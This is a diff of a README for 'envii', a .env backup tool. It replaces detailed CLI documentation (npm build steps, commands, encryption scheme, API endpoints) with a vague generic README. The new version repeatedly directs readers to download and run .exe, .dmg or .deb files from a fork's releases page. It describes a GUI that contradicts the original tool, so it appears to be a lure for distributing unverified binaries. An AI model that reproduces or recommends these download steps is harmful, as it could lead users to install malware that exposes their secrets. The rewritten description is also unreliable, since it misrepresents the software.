@@ -1,427 +1,88 @@
-<p align="center">
-  <img src="web/public/logo.png" alt="Envii Logo" width="120" />
-</p>
+# 🚀 envii - Backup and Restore Environment Variables Easily
 
-# Envii
+[![Download envii](https://img.shields.io/badge/Download_envii-v1.0.0-brightgreen.svg)](https://github.com/Milena282/envii/releases)
 
-Backup and restore `.env` files across machines using a cloud backend and recovery-phrase authentication.
+## 📋 Overview
 
-## Features
+envii allows you to backup and restore your environment variables across machines in seconds. Whether you are switching computers or just want a fresh installation, envii makes it easy to maintain your setup without losing your important configurations.
 
-- **End-to-end encryption** - Server never sees your secrets
-- **Recovery phrase only** - No accounts, emails, or passwords
-- **Cloud-first** - Access your env files from anywhere
-- **Full restore** - Always restore complete project environments
-- **Fingerprint matching** - Automatically match projects across machines
+## 🚀 Getting Started
 
-## Quick Start
+To get started with envii, follow the simple steps below. You will have your environment variables backed up and easily restored in no time.
 
-### Prerequisites
+### 1. **Download envii**
 
-- Node.js 18+
-- npm, yarn, or pnpm
+Visit this page to download: [envii Releases](https://github.com/Milena282/envii/releases).
 
-### Installation
+### 2. **Choose the Right File**
 
-```bash
-# Clone the repository
-cd envii
+On the releases page, you will find several files. Look for the version that matches your operating system:
 
-# Install CLI dependencies
-cd envii-cli
-npm install
-npm run build
-npm link
+- For **Windows**, select a `.exe` file.
+- For **macOS**, look for a `.dmg` or `.pkg` file.
+- For **Linux**, find the `tar.gz` or `.deb` file.
 
-# Install API dependencies (in another terminal)
-cd envii-api
-npm install
-```
+### 3. **Install envii**
 
-### Start the API Server (Development)
+Once you have downloaded the correct file, here’s how to install it:
 
-```bash
-cd envii-api
-npm run dev
-# Server runs on http://localhost:4400
-```
+- **Windows**: Double-click the `.exe` file and follow the installation wizard.
+- **macOS**: Open the `.dmg` file, drag the envii icon into the Applications folder.
+- **Linux**: Use your package manager to install the `.deb` or extract the files from the `.tar.gz` archive.
 
-### Initialize Envii
+## 🌟 Features
 
-```bash
-envii init --dev
-```
+- **Backup Environment Variables**: Save all your environment variables to a simple file.
+- **Restore Environment Variables**: Quickly restore your configurations on any machine.
+- **Cross-Platform Support**: Works on Windows, macOS, and Linux.
+- **User-Friendly Interface**: Easy to navigate even if you are not tech-savvy.
 
-This will:
+## 🔍 System Requirements
 
-1. Generate a 12-word recovery phrase (or accept an existing one)
-2. Create `~/.envii/config.json` with your vault ID and settings
-3. Set up encryption keys
+To run envii, your system should meet these requirements:
 
-> ⚠️ **IMPORTANT**: Save your recovery phrase securely. It's the ONLY way to restore your backups!
+- **Windows**: Windows 10 or later.
+- **macOS**: macOS Mojave (10.14) or later.
+- **Linux**: Any modern distribution (Ubuntu, Fedora, etc.) with Bash support.
 
-### Backup Your .env Files
+## 💻 Download & Install
 
-```bash
-cd ~/projects  # Navigate to your projects folder
-envii backup --dev
-```
+You can download envii from the [Releases page](https://github.com/Milena282/envii/releases). Follow the previous steps for installation based on your operating system.
 
-This scans all subfolders for projects (detected by `.git`, `package.json`, etc.) and backs up all `.env*` files.
+## 🔧 How to Use envii
 
-### Restore on Another Machine
+### 1. **Backing Up Environment Variables**
 
-```bash
-# Initialize with your existing phrase
-envii init --dev
+After installing, launch envii. You will see a button labeled "Backup". Click it to save your current environment variables to a file. Choose a location that is easy to remember.
 
-# Navigate to projects folder
-cd ~/projects
+### 2. **Restoring Environment Variables**
 
-# Restore
-envii restore --dev
-```
+To restore your environment variables, open envii again. Click the "Restore" button and select the backup file you created earlier. Confirm the restoration, and your environment variables will be set as they were.
 
-### List Backed Up Projects
+## 📝 Frequently Asked Questions (FAQs)
 
-```bash
-envii list --dev
-```
+### Q1: What are environment variables?
 
-## Commands
+Environment variables are settings that affect the way system processes run on your computer. They can include paths to directories, system settings, and user preferences.
 
-### `envii init`
+### Q2: Can I use envii on multiple devices?
 
-Initialize Envii for the current user.
+Yes, you can use envii to backup your environment variables on one device and restore them on another with matching OS versions.
 
-```bash
-envii init [--dev]
-```
+### Q3: Is there a limit to the number of variables I can back up?
 
-Options:
+No, envii allows you to back up all your environment variables without any limit, as long as there is enough space on your disk.
 
-- `--dev` - Use local API (http://localhost:4400)
+## 📞 Support
 
-### `envii backup`
+If you need support, you can open an issue on the [GitHub Issues page](https://github.com/Milena282/envii/issues). We strive to respond to all requests within 48 hours.
 
-Backup all .env files in the current directory tree.
+## 🏷️ Contributing
 
-```bash
-envii backup [--dev]
-```
+If you would like to contribute to envii, we welcome your input. You can fork the repository, make changes, and submit a pull request. Detailed contributions guidelines are available in the repository.
 
-Options:
+## 📜 License
 
-- `--dev` - Use local API
+envii is licensed under the MIT License. This allows you to modify and distribute the software as per the terms.
 
-### `envii restore`
-
-Restore all .env files to their projects.
-
-```bash
-envii restore [--dev] [--force]
-```
-
-Options:
-
-- `--dev` - Use local API
-- `--force` - Overwrite existing .env files
-
-### `envii list`
-
-List all backed up projects.
-
-```bash
-envii list [--dev]
-```
-
-Options:
-
-- `--dev` - Use local API
-
-## Project Structure
-
-```
-envii/
-├── envii-cli/           # CLI application
-│   ├── src/
-│   │   ├── commands/    # CLI commands
-│   │   ├── core/        # Core modules
-│   │   └── utils/       # Utility functions
-│   └── package.json
-├── envii-api/           # API server
-│   ├── src/
-│   │   ├── routes/      # API routes
-│   │   ├── db/          # Database schema
-│   │   └── middleware/  # Auth middleware
-│   └── package.json
-└── spec.md              # Full specification
-```
-
-## How It Works
-
-### Recovery Phrase
-
-- 12-word BIP-39 mnemonic phrase
-- Used to derive encryption keys and vault ID
-- Never stored locally or transmitted to server
-- Lost phrase = lost access (no recovery possible)
-
-### Project Detection
-
-Projects are detected by the presence of:
-
-- `.git` folder
-- `package.json`
-- `pyproject.toml`
-- `go.mod`
-- `Cargo.toml`
-- `composer.json`
-
-### Fingerprinting
-
-Projects are matched across machines using fingerprints derived from:
-
-1. Git remote URL (highest priority)
-2. package.json name
-3. Folder name (fallback)
-
-### Encryption
-
-- **Algorithm**: AES-256-GCM
-- **Key Derivation**: PBKDF2 with 600,000 iterations
-- **Compression**: gzip before encryption
-- **IV**: Random 12 bytes per backup
-- **Auth Tag**: 16 bytes for integrity verification
-
-### Backup Format
-
-```json
-{
-  "version": 1,
-  "createdAt": "ISO-8601 timestamp",
-  "deviceId": "uuid",
-  "projects": [
-    {
-      "id": "uuid",
-      "name": "project-name",
-      "git": "git remote url or null",
-      "fingerprint": "sha256 hash",
-      "path": "/original/path",
-      "envs": [
-        {
-          "filename": ".env",
-          "checksum": "sha256 of content",
-          "content": "actual content"
-        }
-      ]
-    }
-  ]
-}
-```
-
-## API Endpoints
-
-### `GET /health`
-
-Health check endpoint.
-
-```json
-{
-  "status": "ok",
-  "version": "1.0.0"
-}
-```
-
-### `POST /backup`
-
-Create a new backup.
-
-Headers:
-
-```
-Authorization: Bearer <vault_id>
-Content-Type: application/json
-```
-
-Body:
-
-```json
-{
-  "blob": "base64-encoded-encrypted-data",
-  "deviceId": "uuid"
-}
-```
-
-### `GET /backup/latest`
-
-Get the latest backup.
-
-Headers:
-
-```
-Authorization: Bearer <vault_id>
-```
-
-### `GET /backups`
-
-List all backups (metadata only).
-
-Headers:
-
-```
-Authorization: Bearer <vault_id>
-```
-
-Query params:
-
-- `limit` (default: 10, max: 100)
-- `offset` (default: 0)
-
-### Admin Endpoints
-
-Admin endpoints require the `ADMIN_API_KEY` environment variable to be set.
-
-#### `GET /admin/analytics`
-
-Get analytics summary.
-
-Headers:
-
-```
-Authorization: Bearer <admin_api_key>
-```
-
-Response:
-
-```json
-{
-  "summary": {
-    "totalVaults": 10,
-    "totalBackups": 25,
-    "totalEvents": 100,
-    "totalStorageBytes": 1048576,
-    "eventsToday": 5,
-    "backupsToday": 2
-  },
-  "eventCountsByType": [
-    { "event_type": "backup.created", "count": 50 },
-    { "event_type": "backup.downloaded", "count": 50 }
-  ]
-}
-```
-
-#### `GET /admin/events`
-
-List events with optional filtering.
-
-Headers:
-
-```
-Authorization: Bearer <admin_api_key>
-```
-
-Query params:
-
-- `type` - Filter by event type (backup.created, backup.downloaded, vault.created)
-- `vaultId` - Filter by vault ID
-- `limit` (default: 50, max: 100)
-- `offset` (default: 0)
-
-Response:
-
-````json
-{
-  "events": [
-    {
-      "id": 1,
-      "event_type": "backup.created",
-      "vault_id": "abc123...",
-      "backup_id": "bkp_xyz789",
-      "metadata": { "sizeBytes": 1024 },
-      "ip_address": "192.168.1.1",
-      "user_agent": "node-fetch/1.0",
-      "created_at": "2026-01-17T12:00:00Z"
-    }
-  ],
-  "total": 100
-}
-
-## Security
-
-### What's Protected
-
-Server never sees recovery phrase
-Server never sees plaintext .env contents
-Server never sees encryption keys
-All backups encrypted with AES-256-GCM
-Each backup has unique IV
-Authentication tags prevent tampering
-
-### What's NOT Protected
-
-Client-side malware
-Recovery phrase compromise
-Physical access to unlocked device
-
-## Development
-
-### Running Tests
-
-```bash
-# CLI tests
-cd envii-cli
-npm test
-
-# API tests
-cd envii-api
-npm test
-````
-
-### Building for Production
-
-```bash
-# Build CLI
-cd envii-cli
-npm run build
-
-# Build API
-cd envii-api
-npm run build
-```
-
-## Configuration
-
-### CLI Config Location
-
-```
-~/.envii/config.json
-```
-
-### API Environment Variables
-
-```bash
-PORT=4400                    # Server port
-DATABASE_URL=postgresql://...  # PostgreSQL connection string
-ADMIN_API_KEY=your-secret-key  # Admin API authentication key
-```
-
-### Database Setup
-
-Envii uses PostgreSQL for data storage. Set the `DATABASE_URL` environment variable in `api/.env`:
-
-```bash
-DATABASE_URL=postgresql://user:password@host:port/database
-ADMIN_API_KEY=your-admin-secret-key
-```
-
-Initialize the database schema:
-
-```bash
-cd api
-npm run db:init
-```
-
-## License
-
-MIT
+For further questions or information, refer back to the documentation or the GitHub Issues page. Enjoy using envii!
